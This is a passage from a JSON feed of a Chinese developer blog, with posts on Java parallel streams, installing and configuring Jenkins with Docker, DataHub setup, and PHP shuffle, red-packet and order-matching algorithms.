class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">public class StreamTest &#123;</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</span><br><span class=\"line\">        for (int i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">            list.add(i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(list);</span><br><span class=\"line\">        List&lt;Integer&gt; result = list.stream().parallel().map(i -&gt; i++).collect(Collectors.toList());</span><br><span class=\"line\">        System.out.println(result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>我勒个去，什么情况？<br><img src=\"/img/2024/202405104.webp\" alt=\"erik.xyz\"></p>\n<p><strong>（3）parallel()的优缺点</strong></p>\n<p><strong>①优点：</strong></p>\n<p>1.充分利用多核 CPU 的优势，提高程序的性能；</p>\n<p>2.可以简化多线程编程，减少开发难度。</p>\n<p><strong>②缺点：</strong></p>\n<p>1.并行处理可能会引入线程安全等问题，需要根据具体情况进行选择；</p>\n<p>2.并行处理需要付出额外的开销，例如线程池的创建和销毁、线程切换等，对于小数据量和简单计算而言，串行处理可能更快。</p>\n<p><strong>（4）何时使用parallel()？</strong></p>\n<p>在实际开发中，应该根据数据量、计算复杂度、硬件等因素综合考虑。</p>\n<p>比如：</p>\n<p>1.数据量较大，有1万个元素；</p>\n<p>2.计算复杂度过大，需要对每个元素进行复杂的计算；</p>\n<p>3.硬件够硬，比如多核CPU。</p>\n<h4 id=\"七、算法优化\"><a href=\"#七、算法优化\" class=\"headerlink\" title=\"七、算法优化\"></a>七、算法优化</h4><p>在上面的例子中，避免base64解密，就应该归类于算法优化。</p>\n<p>程序就是由数据结构和算法组成，一个优质的算法可以显著提高程序的执行效率，从而减少运行时间和资源消耗。相比之下，一个低效的算法就可能导致运行非常缓慢，并占用大量系统资源。</p>\n<p>很多问题都可以通过算法优化来解决，比如：</p>\n<p><strong>1、循环和递归</strong></p>\n<p>循环和递归是Java编程中常见的操作，然而，过于复杂的业务逻辑往往会带来多层循环套用，不必要的重复循环会大大降低程序的执行效率。</p>\n<p>递归是一种函数自我调用的技术，类似于循环，虽然递归可以解决很多问题，但是，递归的效率有待提高。</p>\n<p><strong>2、内存管理</strong></p>\n<p>Java自带垃圾收集器，开发人员不用手动释放内存。</p>\n<p>但是，不合理的内存使用可能导致内存泄漏和性能下降，确保及时释放不再使用的对象，避免创建过多的临时对象。</p>\n<p><strong>3、字符串</strong></p>\n<p>我觉得字符串是Java编程中使用频率最高的技术，很多程序员恨不得把所有的变量都定义成字符串。</p>\n<p>然而，由于字符串是不可变的，每次执行字符串拼接、替换时，都会创建一个新的字符串。这会占用大量的内存和处理时间。</p>\n<p>使用StringBuilder来处理字符串的拼接可以显著的提高性能。</p>\n<p><strong>4、IO操作</strong></p>\n<p>IO操作通常是最耗费性能和资源的操作。在处理大量数据IO操作时，务必注意优化IO代码，提高程序性能，比如上面提高的图片不落地就是彻底解决IO问题。</p>\n<p><strong>5、数据结构的选择</strong></p>\n<p>选择适当的数据结构对程序的性能至关重要。</p>\n<p>比如Java世界中用的第二多的Map，比较常用的有HashMap、HashTable、ConcurrentHashMap。</p>\n<p>HashMap，底层数组+链表实现，可以存储null键和null值，线程不安全；</p>\n<p>HashTable，底层数组+链表实现，无论key还是value都不能为null，线程安全，实现线程安全的方式是在修改数据时锁住整个HashTable，效率低，ConcurrentHashMap做了相关优化；</p>\n<p>ConcurrentHashMap，底层采用分段的数组+链表实现，线程安全，通过把整个Map分为N个Segment，可以提供相同的线程安全，但是效率提升N倍，默认提升16倍。</p>\n<p>Hashtable的synchronized是针对整张Hash表的，即每次锁住整张表让线程独占，ConcurrentHashMap允许多个修改操作并发进行，其关键在于使用了锁分离技术。</p>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/V2p_p-KoDowlZxLN2by2Sg\">哪吒编程</a></p>\n",
            "tags": [
                "web",
                "优化"
            ]
        },
        {
            "id": "https://erik.xyz/2024/04/06/five-jenkis/",
            "url": "https://erik.xyz/2024/04/06/five-jenkis/",
            "title": "5分钟搞定Jenkis",
            "date_published": "2024-04-06T01:04:00.000Z",
            "content_html": "<h4 id=\"什么是持续集成\"><a href=\"#什么是持续集成\" class=\"headerlink\" title=\"什么是持续集成\"></a>什么是持续集成</h4><p>持续集成 Continuous integration ，简称CI随着软件开发复杂度的不断提高，团队开发成员间如何更好地协同工作以确保软件开发的质量已经慢慢成为开发过程中不可回避的问题。尤其是近些年来，敏捷（Agile） 在软件工程领域越来越红火，如何能在不断变化的需求中快速适应和保证软件的质量也显得尤其的重要。持续集成正是针对这一类问题的一种软件开发实践。它倡导团队开发成员必须经常集成他们的工作，甚至每天都可能发生多次集成。而每次的集成都是通过自动化的构建来验证，包括自动编译、发布和测试，从而尽快地发现集成错误，让团队能够更快的开发内聚的软件。<br><span id=\"more\"></span><br>持续集成具有的特点：</p>\n<ul>\n<li><p>它是一个自动化的周期性的集成测试过程，从检出代码、编译构建、运行测试、结果记录、测试统计等都是自动完成的，无需人工干预；</p>\n</li>\n<li><p>需要有专门的集成服务器来执行集成构建；</p>\n</li>\n<li>需要有代码托管工具支持，例如Git以及可视化界面Gogs的使用</li>\n</ul>\n<p>持续集成的作用：</p>\n<ul>\n<li>保证团队开发人员提交代码的质量，减轻了软件发布时的压力；</li>\n<li>持续集成中的任何一个环节都是自动完成的，无需太多的人工干预，有利于减少重复过程以节省时间、费用和工作量；</li>\n</ul>\n<h4 id=\"Jenkins简介\"><a href=\"#Jenkins简介\" class=\"headerlink\" title=\"Jenkins简介\"></a>Jenkins简介</h4><p>Jenkins，原名Hudson，2011年改为现在的名字，它是一个开源的实现持续集成的软件工具。官方网站：<a href=\"http://jenkins-ci.org/。\">http://jenkins-ci.org/。</a></p>\n<p>Jenkins 能实施监控集成中存在的错误，提供详细的日志文件和提醒功能，还能用图表的形式形象地展示项目构建的趋势和稳定性。</p>\n<p>特点：</p>\n<ul>\n<li>易安装：仅仅两个docker命令即可从官网下载直接运行，无需额外的安装，更无需安装数据库；</li>\n<li>易配置：提供友好的GUI配置界面；</li>\n<li>变更支持：Jenkins能从代码仓库（Subversion/CVS）中获取并产生代码更新列表并输出到编译输出信息中；</li>\n<li>支持永久链接：用户是通过web来访问Jenkins的，而这些web页面的链接地址都是永久链接地址，因此，你可以在各种文档中直接使用该链接；</li>\n<li>集成E-Mail/RSS/IM：当完成一次集成时，可通过这些工具实时告诉你集成结果（据我所知，构建一次集成需要花费一定时间，有了这个功能，你就可以在等待结果过程中，干别的事情）；</li>\n<li>JUnit/TestNG测试报告：也就是用以图表等形式提供详细的测试报表功能；</li>\n<li>支持分布式构建：Jenkins可以把集成构建等工作分发到多台计算机中完成；</li>\n<li>文件指纹信息：Jenkins会保存哪次集成构建产生了哪些jars文件，哪一次集成构建使用了哪个版本的jars文件等构建记录；</li>\n<li>支持第三方插件：使得 Jenkins 变得越来越强大Jenkins安装与启动（1）执行安装命令,下载jenkins</li>\n</ul>\n<h4 id=\"Jenkins安装与启动\"><a href=\"#Jenkins安装与启动\" class=\"headerlink\" title=\"Jenkins安装与启动\"></a>Jenkins安装与启动</h4><p>1）执行安装命令,下载jenkins<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull jenkins/jenkins</span><br></pre></td></tr></table></figure><br>（2）启动服务<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -p 8080:8080 -p 50000:50000 -v /mnt/data/jenkins:/var/jenkins_home --name &quot;jenkins&quot; jenkins/jenkins</span><br></pre></td></tr></table></figure><br><img src=\"/img/2024/20240411.jpeg\" alt=\"erik.xyz\"></p>\n<p>若报错如下:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch: cannot touch ‘/var/jenkins_home/copy_reference_file.log’: Permission denied</span><br><span class=\"line\">Can not write to /var/jenkins_home/copy_reference_file.log. Wrong volume permissions?</span><br></pre></td></tr></table></figure></p>\n<p>需要修改下目录权限, 因为当映射本地数据卷时，/mnt/data/jenkins目录的拥有者为root用户，而容器中jenkins user的uid为1000<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chown -R 1000:1000 /mnt/data/jenkins</span><br></pre></td></tr></table></figure><br>（3）访问链接 <a href=\"http://10.20.29.151:8080\">http://10.20.29.151:8080</a></p>\n<p>若密码忘记，可进入容器，执行<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /var/lib/jenkins/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure><br>获取初始密码串。</p>\n<p>若目录不存在，可使用<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name &quot;initialAdminPassword&quot; -depth -print</span><br></pre></td></tr></table></figure><br>命令查找。<br><img src=\"/img/2024/20240412.png\" alt=\"erik.xyz\"></p>\n<p>（4）安装插件<br><img src=\"/img/2024/20240413.png\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240414.png\" alt=\"erik.xyz\"></p>\n<p>（5）新建用户<br><img src=\"/img/2024/20240415.png\" alt=\"erik.xyz\"></p>\n<p>完成安装进入主界面<br><img src=\"/img/2024/20240416.png\" alt=\"erik.xyz\"></p>\n<h4 id=\"Jenkins插件安装\"><a href=\"#Jenkins插件安装\" class=\"headerlink\" title=\"Jenkins插件安装\"></a>Jenkins插件安装</h4><p>我们以安装maven插件为例，演示插件的安装</p>\n<p>（1）点击左侧的“系统管理”菜单 ,然后点击<br><img src=\"/img/2024/20240417.jpeg\" alt=\"erik.xyz\"></p>\n<p>（2）选择“可选插件”选项卡，搜索maven，在列表中选择Maven Integration ，点击“直接安装”按钮<br><img src=\"/img/2024/20240418.jpeg\" alt=\"erik.xyz\"></p>\n<p>看到如下图时，表示已经完成<br><img src=\"/img/2024/20240419.png\" alt=\"erik.xyz\"></p>\n<h5 id=\"全局工具配置\"><a href=\"#全局工具配置\" class=\"headerlink\" title=\"全局工具配置\"></a>全局工具配置</h5><p>选择系统管理，全局工具配置<br><img src=\"/img/2024/20240420.png\" alt=\"erik.xyz\"></p>\n<p><strong>自动安装</strong></p>\n<p>Jenkins提供了两种工具配置的方式，我们还是以maven为例<br><img src=\"/img/2024/20240421.png\" alt=\"erik.xyz\"></p>\n<p>第一种如上图，只需要选择自动安装和版本号就可以，同时Jenkins在右上角给出了一个解疑按键，可以通过该键看到说明和示例。</p>\n<p><strong>本地安装</strong><br>相较于第一种方式，第二种方式相对麻烦一些，但好处是可以在以后打包的时候不必重新下载，缩短打包的时间。</p>\n<p>下面就来教大家如何安装Maven与本地仓库：</p>\n<p>（1）将Maven压缩包上传至服务器（虚拟机）</p>\n<p>（2）解压<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar zxvf apache-maven-3.5.4-bin.tar.gz</span><br></pre></td></tr></table></figure><br>（3）移动目录<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv apache-maven-3.5.4 /usr/local/maven</span><br></pre></td></tr></table></figure><br>（4）编辑setting.xml配置文件vi /usr/local/maven/conf/settings.xml，配置本地仓库目录,内容如下<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;localRepository&gt;/usr/local/repository&lt;/localRepository&gt;</span><br></pre></td></tr></table></figure><br>（5）将开发环境的本地仓库上传至服务器（虚拟机）并移动到/usr/local/repository 。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv reponsitory_boot /usr/local/repository</span><br></pre></td></tr></table></figure></p>\n<p>其他示例:</p>\n<p>（1）JDK配置<br><img src=\"/img/2024/20240422.png\" alt=\"erik.xyz\"></p>\n<p>设置javahome为 /usr/java/jdk1.8.0_171-amd64</p>\n<p>（2）Git配置 （本地已经安装了Git软件）<br><img src=\"/img/2024/20240423.png\" alt=\"erik.xyz\"></p>\n<p>（3）Maven配置<br><img src=\"/img/2024/20240424.png\" alt=\"erik.xyz\"></p>\n<p><strong>代码上传至Git服务器</strong></p>\n<p>步骤：</p>\n<p>（1）在本地安装git(Windows版本)</p>\n<p>（2）在IDEA中选择菜单 : File — settings , 在窗口中选择Version Control — Git<br><img src=\"/img/2024/20240425.png\" alt=\"erik.xyz\"></p>\n<p>（3）选择菜单VCS —&gt; Enable Version Control Integration…<br><img src=\"/img/2024/20240426.png\" alt=\"erik.xyz\"></p>\n<p>选择Git</p>\n<p>（4）设置远程地址: 右键点击工程选择菜单 Git —&gt; Repository —&gt;Remotes…<br><img src=\"/img/2024/20240427.png\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240428.png\" alt=\"erik.xyz\"></p>\n<p>(5）右键点击工程选择菜单 Git —&gt; Add</p>\n<p>（6）右键点击工程选择菜单 Git —&gt; Commit Directory…</p>\n<p>（7）右键点击工程选择菜单 Git —&gt; Repository —&gt; Push …</p>\n<p><strong>任务的创建与执行</strong></p>\n<p>我们以最火的Java项目和Go项目为例，给大家分别演示如何构建项目和执行</p>\n<p><strong>Go项目</strong></p>\n<p>（1）回到首页，点击新建按钮 .如下图，输入名称，选择创建一个自由风格的项目，点击OK<br><img src=\"/img/2024/20240429.png\" alt=\"erik.xyz\"><br>（2）General管理，可以添加项目描述和GitHub项目路径，以及一些配置<br><img src=\"/img/2024/20240430.png\" alt=\"erik.xyz\"><br>（3）源码管理，选择GitHub<br><img src=\"/img/2024/20240431.png\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240432.png\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240433.png\" alt=\"erik.xyz\"></p>\n<p>（4）构建触发器，配置触发规则，这里以定时和轮询为示例，配别设置为<br><img src=\"/img/2024/20240434.png\" alt=\"erik.xyz\"></p>\n<p>定时构建：定时构建1次任务</p>\n<p>轮询SCM:定时查看源码管理的代码是否更新，有更新则构建，否则不会构建</p>\n<p>如图所示，定时构建为每间隔10分钟定时构建一次，轮询SCM为每5分钟轮询检测一次。</p>\n<p><span style=\"color: #808080;\">时间*号规则为: 分 时 日 月 周</span></p>\n<p>（5）构建环境，配置控制台输出时间戳和指定Go语言版本<br><img src=\"/img/2024/20240435.png\" alt=\"erik.xyz\"><br>（6）构建，使用Shell脚本测试代码上传后的项目是否有效<br><img src=\"/img/2024/20240436.jpeg\" alt=\"erik.xyz\"></p>\n<p>Shell如下:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export GOPATH=$WORKSPACE/../                    # 指定GOPATH路径，Go语言执行必须有GOPATH路径</span><br><span class=\"line\">export GOWORK=$GOPATH/src/github.com/Jenkins    # 创建项目执行时的目录依赖结构</span><br><span class=\"line\">cp -rf $WORKSPACE/* $GOWORK/                    # 使测试运行数据和源数据隔离</span><br><span class=\"line\">cd $GOWORK &amp;&amp; go build                          # 进入项目目录并执行</span><br></pre></td></tr></table></figure></p>\n<p>命令解说：<br><span style=\"color: #808080;\"><br>$GOPATH Go 运行需要指定 GOPATH 也即项目运行路径<br>$WORKSPACE /var/jenkins_home/workspace/Jenkins<br>GOWORK 创建符合代码依赖的执行目录<br>注:下载Go的插件在构建时，会自动为我们设置GOROOT,但不会指定GOPATH，因此需要指定\n</span><br>最后点击“保存”按钮</p>\n<p>（7）执行构建，控制台查看输出<br><img src=\"/img/2024/20240437.jpeg\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240438.jpeg\" alt=\"erik.xyz\"></p>\n<p>构建成功，也输出了WORKSPACE、GOPATH、GOROOT目录，说明配置生效。进入docker容器或是挂载目录查看是否有可执行文件：<br><img src=\"/img/2024/20240439.png\" alt=\"erik.xyz\"><br>除了上述方法，也可以通过shell配置docker等方式构建、部署、运行项目，还可以将项目配置到当前/其他服务器运行，更多配置方式就不一一陈述了，请自行挖掘。</p>\n<p><strong>JAVA项目</strong></p>\n<p>（1）回到首页，点击新建按钮 .如下图，输入名称，选择创建一个Maven项目，点击OK<br><img src=\"/img/2024/20240440.jpeg\" alt=\"erik.xyz\"></p>\n<p>（2）源码管理，选择Git<br><img src=\"/img/2024/20240441.png\" alt=\"erik.xyz\"><br>(3）Build<br><img src=\"/img/2024/20240442.png\" alt=\"erik.xyz\"></p>\n<p>命令:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clean package docker:build -DpushImage</span><br></pre></td></tr></table></figure><br>用于清除、打包，构建docker镜像</p>\n<p>最后点击“保存”按钮</p>\n<p>（4）执行任务</p>\n<p>后续请参照Go项目的执行步骤。</p>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/PEupc5YIKuctZO1Tivy_ug\">架构师社区</a></p>\n",
            "tags": [
                "转载",
                "jenkis",
                "jenkis教程"
            ]
        },
        {
            "id": "https://erik.xyz/2024/03/19/randomization/",
            "url": "https://erik.xyz/2024/03/19/randomization/",
            "title": "数据随机化算法",
            "date_published": "2024-03-19T15:06:00.000Z",
            "content_html": "<p>开发卡牌游戏或者匹配游戏等等，需要重新洗牌或重新更换位置，这就需要清洗数据。那么就以最常见的扑克牌为例，来一个数据随机化算法。<br><span id=\"more\"></span><br>直接上代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> function new_rand($arr)&#123;</span><br><span class=\"line\">    $len=count($arr);</span><br><span class=\"line\">    $new_arr=[];</span><br><span class=\"line\">    for($i=0;$i&lt;$len;$i++)&#123;</span><br><span class=\"line\">        $new_arr[mt_rand()]=$arr[$i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ksort($new_arr);</span><br><span class=\"line\">    return array_values($new_arr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$arr=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,</span><br><span class=\"line\">17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,</span><br><span class=\"line\">33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,</span><br><span class=\"line\">49,50,51,52,53,54];</span><br><span class=\"line\">echo &quot;原始结果&quot;.PHP_EOL;</span><br><span class=\"line\">print_r(json_encode($arr));</span><br><span class=\"line\">$get_arr=new_rand($arr);</span><br><span class=\"line\">echo PHP_EOL.&quot;最终结果&quot;.PHP_EOL;</span><br><span class=\"line\">print_r(json_encode($get_arr));</span><br></pre></td></tr></table></figure>\n<p>最终结果如图：<br><img src=\"/img/2024/20240319223317.png\" alt=\"erik.xyz\"></p>\n",
            "tags": [
                "算法",
                "数据随机化"
            ]
        },
        {
            "id": "https://erik.xyz/2023/11/12/xhprof-plugs/",
            "url": "https://erik.xyz/2023/11/12/xhprof-plugs/",
            "title": "xhprof插件开发",
            "date_published": "2023-11-12T13:51:00.000Z",
            "content_html": "<p>最近开发后总要测试接口性能，来定位接口问题，突然想到有xhprof扩展可以用。翻了翻，发现多数要不代码不更新，要不就是太繁琐，干脆自己开发以下。</p>\n<p>   参考phacility/xhprof、phpxxb/xhprof的项目，自己下载了一份代码。于是就先做了webman的插件<a href=\"https://github.com/erikwang2013/xhprof-webman\">xhprof-webman</a>，磨蹭了一段时间就又弄了laravel版的插件<a href=\"https://github.com/erikwang2013/xhprof-laravel\">xhprof-laravel</a>。最新版已更新，大家有用到的去composer安装吧。</p>\n",
            "tags": [
                "xhprof",
                "webman",
                "laravel",
                "composer",
                "composer插件"
            ]
        },
        {
            "id": "https://erik.xyz/2023/08/21/datahub-install/",
            "url": "https://erik.xyz/2023/08/21/datahub-install/",
            "title": "datahub安装教程",
            "date_published": "2023-08-21T13:30:00.000Z",
            "content_html": "<p>偶然发现datahub很不错，单机部署来了。</p>\n<ol>\n<li><p>本地安装docker，进入到opt目录或home目录，执行以下命令（国内锁了）：</p>\n<pre><code> git clone https://github.com/linkedin/datahub.git\n\n cd /opt/datahub/docker\n\n datahub docker quickstart -f ./quickstart/docker-compose-without-neo4j.quickstart.yml\n\n source ./quickstart.sh\n</code></pre></li>\n</ol>\n<span id=\"more\"></span>\n<ol>\n<li><p>执行以下命令</p>\n<pre><code> python3 -m pip install --upgrade pip wheel setuptools\n python3 -m pip uninstall datahub acryl-datahub || true \n python3 -m pip install --upgrade acryl-datahub\n datahub version\n datahub docker quickstart\n</code></pre><ul>\n<li><p>发现没有pip配置，果断下载<a href=\"https://bootstrap.pypa.io/get-pip.py -o get-pip.py\">get-pip.py</a>，然后执行以下命令安装pip</p>\n<p>  sudo python3 get-pip.py  </p>\n</li>\n<li><p>安装成功后，依次执行以上命令。结果如图</p>\n</li>\n</ul>\n</li>\n</ol>\n<p><img src=\"/img/202308/20230821213432.png\" alt=\"https://erik.xyz\"></p>\n<p>3.使用datahub导入数据</p>\n<pre><code>   pip install pymysql\n   cd /opt/datahub/docker/ingestion\n</code></pre><p><img src=\"/img/202308/20230821213951.png\" alt=\"https://erik.xyz\"></p>\n<ul>\n<li><p>复制一份sample_recipe.yml修改配置文件：</p>\n<pre><code>  vi recipe.yml\n</code></pre><p><img src=\"/img/202308/20230821214242.png\" alt=\"https://erik.xyz\"></p>\n</li>\n<li><p>编辑配置<br><img src=\"/img/202308/20230821214729.png\" alt=\"\"></p>\n<ul>\n<li>具体如下:</li>\n</ul>\n</li>\n</ul>\n<pre><code>source:\n  type: &quot;mysql&quot;\n  config:\n    username: &quot;root&quot;\n    password: &quot;root&quot;\n    database: &quot;games_paly&quot;\n    host_port: &quot;127.0.0.1:3306&quot;\nsink:\n  type: &quot;datahub-rest&quot;\n  config:\n    server: &#39;http://localhost:8080&#39;\n</code></pre><p>4.导入数据</p>\n<pre><code> datahub ingest -c recipe.yml\n</code></pre>",
            "tags": [
                "datahub",
                "datahub安装"
            ]
        },
        {
            "id": "https://erik.xyz/2023/07/01/new-year-read-moeny/",
            "url": "https://erik.xyz/2023/07/01/new-year-read-moeny/",
            "title": "红包算法",
            "date_published": "2023-07-01T14:27:00.000Z",
            "content_html": "<p>红包算法<br>给定具体人数和金额，所有人都有，所有人的金额都是随机。那么，在分配中就要限定最大额度不能超过平局值，最小额度1分，算法如下：</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">function moneyBag($number, $money,  $min = 1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $max = intval($money / $number);</span><br><span class=\"line\">    for ($i = 0; $i &lt; $number; $i++) &#123;</span><br><span class=\"line\">        if ($number - 1 == $i) &#123;</span><br><span class=\"line\">            $end_arr = $money;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $one_money =mt_rand($min, $max);</span><br><span class=\"line\">            $end_arr = $one_money;</span><br><span class=\"line\">            $money -= $end_arr;</span><br><span class=\"line\">            $max = intval($money / ($number-($i+1)));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        yield $end_arr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$last_arr = moneyBag(1000, 10 * 100);</span><br><span class=\"line\">$arr = [];</span><br><span class=\"line\">foreach ($last_arr as $end) &#123;</span><br><span class=\"line\">    var_dump(bcdiv($end, 100, 2));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最终结果如下：<br><img src=\"/img/202306/20230701223119.png\" alt=\"https://erik.xyz\"></p>\n",
            "tags": [
                "算法",
                "红包算法"
            ]
        },
        {
            "id": "https://erik.xyz/2023/06/06/matching-amount-algorithm/",
            "url": "https://erik.xyz/2023/06/06/matching-amount-algorithm/",
            "title": "php撮合算法",
            "date_published": "2023-06-06T12:37:00.000Z",
            "content_html": "<p>在同一平台中买卖交易，需要进行订单撮合。相近的金额从大到小递减组合。期初想用mq分别匹配整数的金额倍数处理，总觉的不太完美。最近刚好有空就找到了猴子选大王算法：<br><span id=\"more\"></span><br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">function King($monkeys_arr,$m)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $i = 0;</span><br><span class=\"line\">    $finsh=[];</span><br><span class=\"line\">    while(count($monkeys_arr)&gt;1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $i++;</span><br><span class=\"line\">        if($i&gt;count($monkeys_arr)) break;</span><br><span class=\"line\">        $head = array_shift($monkeys_arr);</span><br><span class=\"line\">        if ($head%$m != 0) &#123;</span><br><span class=\"line\">            array_push($monkeys_arr, $head);</span><br><span class=\"line\">            continue;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $finsh[]=$head;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return $finsh;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=king([1,2,6,3,4,8,7],7);</span><br><span class=\"line\">var_dump($a);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br>根据以上算法改造一下。<br>先确定匹配金额顺序，即做降序排列。<br>然后每次匹配到小于指定金额后，减去此金额。把匹配金额赋值为差结果。<br>依次类推。<br>在这过程中记录匹配到的金额、最后差值的余额。<br>撮合代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">function marriedDeal($arr, $change_number)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $i = 0;</span><br><span class=\"line\">    $finsh = []; //匹配到的金额</span><br><span class=\"line\">    $default_total = count($arr);</span><br><span class=\"line\">    if($default_total==0) return [];</span><br><span class=\"line\">    arsort($arr);</span><br><span class=\"line\">    $blance = 0;  //最后余额</span><br><span class=\"line\">    while ($default_total &gt;= 1) &#123;</span><br><span class=\"line\">        $i += 1;</span><br><span class=\"line\">        if ($i &gt; $default_total || $change_number &lt;= 0) break;</span><br><span 